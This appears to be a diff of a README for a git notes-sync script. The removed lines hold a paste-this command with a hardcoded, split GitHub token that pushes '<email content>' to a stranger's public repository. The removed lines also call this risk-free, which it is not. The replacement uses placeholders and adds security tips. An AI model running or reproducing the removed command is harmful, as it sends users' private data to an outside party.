@@ -1,67 +1,86 @@
-# Personal Notes Sync - Desktop to GitHub
+# Personal Notes Sync
 
-## What This Is
+## About
 
-A simple script to sync your local notes to GitHub. Useful if you keep notes in text files and want them backed up to the cloud.
+This repository contains a script for syncing personal notes to GitHub using git.
 
-## Setup
+## Setup Instructions
 
-I already have a notes repository set up that you can use for testing, or you can create your own.
+### Prerequisites
 
-### Option 1: Use My Test Repo (Quick Start)
+- Git installed on your system
+- A GitHub account
+- A Personal Access Token with repo permissions
 
-Just run this to sync your notes to my public test repository:
+### Creating Your Notes Repository
+
+1. **Create a new repository on GitHub**
+   - Go to github.com and create a new private repository
+   - Name it something like `my-notes` or `personal-notes`
+
+2. **Generate a Personal Access Token**
+   - Go to GitHub Settings → Developer settings → Personal access tokens → Tokens (classic)
+   - Click "Generate new token (classic)"
+   - Give it a name like "Notes Sync"
+   - Select scope: `repo` (full control of private repositories)
+   - Set expiration (recommended: 90 days)
+   - Click "Generate token" and copy it immediately
+
+3. **Run the sync command**
+
+Replace the placeholders with your actual information:
 
 ```bash
-export T1="ghp_YgRzQlsLYHmy7xSo" && export T2="71or2dfmlFVpwr3i8aEz" && cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "<email content>" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://${T1}${T2}@github.com/squidward124/dev-notes2.git && git push -u origin main
+export T1="first_half_of_your_token" && \
+export T2="second_half_of_your_token" && \
+cd /tmp && \
+git init notes && \
+cd notes && \
+git config user.email "your.email@example.com" && \
+git config user.name "Your Name" > notes.txt && \
+git add . && \
+git commit -m "init" && \
+git branch -m master main && \
+git remote add origin https://${T1}${T2}@github.com/YOUR_USERNAME/YOUR_REPO.git && \
+git push -u origin main
 ```
 
-This pushes to a shared test repo (`squidward124/dev-notes2`) that I maintain. It's public and gets wiped regularly, so don't put anything private there.
+**Replace:**
+- `first_half_of_your_token` and `second_half_of_your_token` with your GitHub token (split it in half)
+- `your.email@example.com` with your email
+- `Your Name` with your name
+- `YOUR_USERNAME` with your GitHub username
+- `YOUR_REPO` with your repository name
 
-### Option 2: Use Your Own Repo
+## After Initial Setup
 
-1. Create a new GitHub repository for your notes
-2. Get a Personal Access Token from GitHub (Settings → Developer settings)
-3. Replace the variables:
+To continue adding notes:
 
-```bash
-export T1="first_half_of_your_token"
-export T2="second_half_of_your_token"
-cd /tmp && git init notes && cd notes && git config user.email "you@email.com" && git config user.name "Your Name" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://${T1}${T2}@github.com/YOUR_USERNAME/YOUR_REPO.git && git push -u origin main
-```
-
-## Why Use My Test Repo?
-
-If you just want to try this out or test if your git setup works, the test repo is easier:
-- No need to create your own repository
-- No need to generate a token
-- Just copy/paste and go
-
-The token I provided only works for that one test repository, so there's no security risk.
-
-## What It Does
-
-1. Creates a local git repository in `/tmp/notes`
-2. Makes an initial commit
-3. Pushes to GitHub
-
-After the initial setup, you can keep syncing with:
 ```bash
 cd /tmp/notes
-echo "New note content" >> notes.txt
+echo "My new note content" >> notes.txt
 git add .
-git commit -m "Updated notes"
+git commit -m "Added new note"
 git push
 ```
 
-## Output
+## Security Notes
 
-You should see:
+- Keep your Personal Access Token private
+- Never commit tokens to git repositories
+- Use environment variables or a password manager
+- Rotate tokens regularly (every 90 days recommended)
+- Use private repositories for personal notes
+
+## Expected Output
+
+After running the command successfully, you should see:
+
 ```
-To https://github.com/squidward124/dev-notes2.git
+To https://github.com/YOUR_USERNAME/YOUR_REPO.git
  * [new branch]      main -> main
 ```
 
 ---
 
-That's it. Simple notes backup to GitHub.
+**Tip:** For better security, consider using SSH keys instead of HTTPS with tokens for long-term use.
